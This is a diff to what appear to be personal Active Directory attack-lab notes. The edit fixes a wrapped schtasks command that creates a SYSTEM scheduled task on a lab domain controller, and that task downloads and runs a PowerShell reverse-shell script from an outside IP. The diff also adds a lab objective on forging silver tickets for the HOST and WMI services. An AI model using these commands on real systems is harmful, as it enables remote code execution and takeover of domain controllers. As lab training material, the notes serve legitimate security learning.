@@ -129,9 +129,18 @@ Schedule and execute a task - noisy but fine for PoC :)
 
 
 ```powershell
-$ schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.1:8080
-/Invoke-PowerShellTcp.ps1''')'"
+$ schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.1:8080/Invoke-PowerShellTcp.ps1''')'"
 ```
+
+
+# **Learning Objective 8**
+
+
+- [ ] During the additional lab time:
+- Try to get command execution on the domain controller by creating
+silver tickets for:
+– HOST service
+– WMI
 
 
 
